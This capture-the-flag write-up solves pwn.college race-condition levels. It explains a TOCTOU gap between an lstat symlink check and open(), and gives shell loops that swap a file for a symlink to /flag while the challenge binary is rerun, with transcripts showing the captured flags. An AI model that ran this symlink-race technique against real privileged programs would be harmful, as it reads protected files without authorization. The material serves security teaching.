---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/system-security/race-conditions
---

## level1.0

> Read the flag file, but the program verifies the path doesn't contain "flag" and that the file is not a symlink.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0
###
### Welcome to /challenge/babyrace_level1.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be sent to you.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
babyrace_level1.0: <stdin>:47: main: Assertion `argc > 1' failed.
Aborted
```

The program performs two checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).

After both checks pass, it opens the file and sends the contents to stdout.

### TOCTOU

The key insight is that these checks and the subsequent `open()` call are **not atomic**. There is a small window of time between the **check** (is it a symlink?) and the **use** (actually opening the file).

```
Timeline:
  Program:   [lstat check — NOT symlink ✓] ----gap---- [open() → reads file]
  Attacker:       ^real file here^          ^swap!^      ^symlink to /flag^
```

If we can swap a regular file for a symlink to `/flag` inside that window, the program will pass the check against the regular file but then open our symlink, leaking the real flag.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    /challenge/babyrace_level1.0 x
done
```

Eventually the program checks `x` when it is a normal file, then opens it after it has become a symlink to `/flag`, printing the flag.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0 x
pwn.college{rAc3C0nd1t10ns_TOCTOUl1v3s.0VMzIDL4ITM0EzW}
```

&nbsp;

## level1.1

> Exploit a basic race condition to get the flag.

```
hacker@race-conditions~level1-1:~$ /challenge/babyrace_level1.1 
###
### Welcome to /challenge/babyrace_level1.1!
###

babyrace_level1.1: <stdin>:40: main: Assertion `argc > 1' failed.
Aborted                    /challenge/babyrace_level1.1
```

This challenge is the exact same as [level1.0](#level10).

### Exploit

Terminal 1:

```
hacker@race-conditions~level1-1:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```
hacker@race-conditions~level1-1:~$ while true; do     /challenge/babyrace_level1.1 x; done
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: file is a symlink!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

pwn.college{cHDaunhEvD4T9hYDJvi33NxNTe5.0lMwQDL4ITM0EzW}
```

&nbsp;

## babyrace_level2.0

> Exploit a race condition with a tighter timing window to read the flag. Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!

```text
hacker@race-conditions~level2-0:~$ /challenge/babyrace_level2.0
###
### Welcome to /challenge/babyrace_level2.0!
###
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Paused (press enter to continue)
```

Same TOCTOU vulnerability as [level1.0](#level10), but the program pauses between the `lstat` check and the `open()` call, making the race window much larger and easier to win.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    /challenge/babyrace_level2.0 x
done
###
### Welcome to /challenge/babyrace_level2.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level2.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)

Paused (press enter to continue)

hi
### Goodbye!
###
### Welcome to /challenge/babyrace_level2.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)

Paused (press enter to continue)

pwn.college{U8-2_E6AoYrIX5lnG5sdQMgCRBV.01MwQDL4ITM0EzW}
```

The pauses make the race window so large that the loop wins almost immediately. The first run fails because `x` didn't exist yet. The second reads the dummy file. The third catches `x` as a symlink to `/flag` between the two pauses.